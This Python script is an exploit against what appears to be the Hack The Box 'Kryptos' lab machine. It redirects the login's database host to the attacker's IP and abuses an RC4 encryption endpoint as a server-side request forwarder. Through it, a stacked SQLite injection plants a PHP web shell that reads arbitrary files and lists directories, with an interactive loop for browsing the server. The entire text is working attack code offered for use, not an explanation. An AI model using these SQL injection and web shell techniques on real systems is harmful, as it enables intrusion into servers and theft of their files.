# kryptos_lfi.py
import requests as r

target = "http://10.10.10.129"
htb_ipv4 = "10.10.12.248"
session = r.Session()

def clearScreen(clear="clear"):
    __import__("os").system(clear)

def encodeURL(parameter_value):
    return __import__("urllib").parse.quote(parameter_value)

def encryptRC4(file_url):
    parameters = (("cipher", "RC4"), ("url", file_url))
    return session.get(target+"/encrypt.php", params=parameters)

def extractText(regex_filter, text):
    return __import__("re").findall(regex_filter, text)[0]

def decryptRC4(rc4_base64):
    print("\n[Decrypted RC4]\n")    
    if(rc4_base64):     
        rc4 = __import__("base64").b64decode(rc4_base64)
        key_stream = open("rc4_key_stream", "rb").read()
        return "".join([chr(rc4[x]^key_stream[x]) for x in range(0, len(rc4))])
    else: return "Nothing was decypted..."

# HTTP Session
data = {
    "username": "placeholder",
    "password": "placeholder",
    "db": "cryptor;host="+htb_ipv4,
    "token": session.get(target).text[737:801],
    "login": ""
}
print(data)
req_post = session.post(target, data=data)

# SQLite3 Injection Payload
output_file = "d9e28afcf0b274a5e0542abb67db0784/lfi.php"
database = "; ATTACH DATABASE \"" + output_file + "\" AS fileview"
table = "; CREATE TABLE fileview.code (php text)"
php_code = """<?php
if(isset($_GET['file'])) {
    echo '\n\n[[['.file_get_contents($_GET['file']).']]]\n\n';
}
else if(isset($_GET['dir'])) {
    print_r(scandir($_GET['dir']));
}
?>"""
table_value = "; INSERT INTO fileview.code (php) VALUES (\"" + php_code + "\");"

# Upload lfi.php to the world writable directory
injection = "1" + database + table + table_value
injectable = "http://127.0.0.1/dev/sqlite_test_page.php?no_results=1&bookid="
url_in = injectable + encodeURL(injection)
encryptRC4(url_in)

while True:
    clearScreen()

    file_in = "?file=" + encodeURL(input("View contents of: "))
    if(file_in=="?file="): 
        file_in = "?dir=" + encodeURL(input("View directory listing: "))
        if(file_in=="?dir="): exit()

    url_in = "http://127.0.0.1/dev/"+ output_file + file_in
    req_encryption = encryptRC4(url_in)
       
    rc4_base64 = extractText('<text.*id="output">(.*)</text', req_encryption.text)
    print(decryptRC4(rc4_base64))

    input("--Press Enter to continue--")


